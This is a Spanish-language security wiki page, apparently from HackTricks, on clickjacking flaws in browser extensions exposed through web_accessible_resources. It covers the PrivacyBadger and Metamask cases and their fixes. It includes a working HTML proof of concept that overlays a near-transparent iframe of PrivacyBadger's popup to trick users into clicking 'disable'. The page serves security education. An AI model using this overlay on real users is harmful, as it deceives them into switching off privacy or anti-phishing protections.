# BrowExt - ClickJacking

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Informaci√≥n B√°sica

Esta p√°gina va a abusar de una vulnerabilidad de ClickJacking en una extensi√≥n del navegador.\
Si no sabes qu√© es el ClickJacking, consulta:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

Las extensiones contienen el archivo **`manifest.json`** y ese archivo JSON tiene un campo `web_accessible_resources`. Esto es lo que [los documentos de Chrome](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources) dicen al respecto:

> Estos recursos estar√≠an disponibles en una p√°gina web a trav√©s de la URL **`chrome-extension://[ID DEL PAQUETE]/[RUTA]`**, que se puede generar con el m√©todo **`extension.getURL`**. Los recursos permitidos se sirven con encabezados CORS apropiados, por lo que est√°n disponibles a trav√©s de mecanismos como XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Los **`web_accessible_resources`** en una extensi√≥n del navegador no solo son accesibles a trav√©s de la web; tambi√©n operan con los privilegios inherentes de la extensi√≥n. Esto significa que tienen la capacidad de:

* Cambiar el estado de la extensi√≥n
* Cargar recursos adicionales
* Interactuar con el navegador hasta cierto punto

Sin embargo, esta caracter√≠stica presenta un riesgo de seguridad. Si un recurso dentro de **`web_accessible_resources`** tiene alguna funcionalidad significativa, un atacante podr√≠a potencialmente incrustar este recurso en una p√°gina web externa. Los usuarios desprevenidos que visiten esta p√°gina podr√≠an activar inadvertidamente este recurso incrustado. Dicha activaci√≥n podr√≠a llevar a consecuencias no deseadas, dependiendo de los permisos y capacidades de los recursos de la extensi√≥n.

## Ejemplo de PrivacyBadger

En la extensi√≥n PrivacyBadger, se identific√≥ una vulnerabilidad relacionada con el directorio `skin/` declarado como `web_accessible_resources` de la siguiente manera (Consulta la publicaci√≥n original en el [blog](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Esta configuraci√≥n condujo a un posible problema de seguridad. Espec√≠ficamente, el archivo `skin/popup.html`, que se renderiza al interactuar con el icono de PrivacyBadger en el navegador, podr√≠a ser incrustado dentro de un `iframe`. Esta incrustaci√≥n podr√≠a ser explotada para enga√±ar a los usuarios para que hagan clic inadvertidamente en "Desactivar PrivacyBadger para este Sitio Web". Tal acci√≥n comprometer√≠a la privacidad del usuario al deshabilitar la protecci√≥n de PrivacyBadger y potencialmente exponer al usuario a un mayor rastreo. Una demostraci√≥n visual de esta explotaci√≥n se puede ver en un ejemplo de video de ClickJacking proporcionado en [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Para abordar esta vulnerabilidad, se implement√≥ una soluci√≥n sencilla: la eliminaci√≥n de `/skin/*` de la lista de `web_accessible_resources`. Este cambio mitig√≥ efectivamente el riesgo al garantizar que el contenido del directorio `skin/` no pudiera ser accedido o manipulado a trav√©s de recursos accesibles por la web.

La soluci√≥n fue f√°cil: **eliminar `/skin/*` de los `web_accessible_resources**`.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Ejemplo de Metamask

Un [**post de blog sobre un ClickJacking en Metamask se puede encontrar aqu√≠**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). En este caso, Metamask solucion√≥ la vulnerabilidad verificando que el protocolo utilizado para acceder fuera **`https:`** o **`http:`** (no **`chrome:`** por ejemplo):

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

**Otro ClickJacking solucionado** en la extensi√≥n de Metamask fue que los usuarios pod√≠an **Hacer clic para agregar a la lista blanca** cuando una p√°gina era sospechosa de ser phishing debido a `‚Äúweb_accessible_resources‚Äù: [‚Äúinpage.js‚Äù, ‚Äúphishing.html‚Äù]`. Como esa p√°gina era vulnerable al Clickjacking, un atacante podr√≠a abusar de ella mostrando algo normal para hacer que la v√≠ctima haga clic para agregarla a la lista blanca sin darse cuenta, y luego regresar a la p√°gina de phishing que estar√≠a en la lista blanca.

## Ejemplo de Steam Inventory Helper

Consulte la siguiente p√°gina para ver c√≥mo se encaden√≥ un **XSS** en una extensi√≥n del navegador con una vulnerabilidad de **ClickJacking**:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## Referencias

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
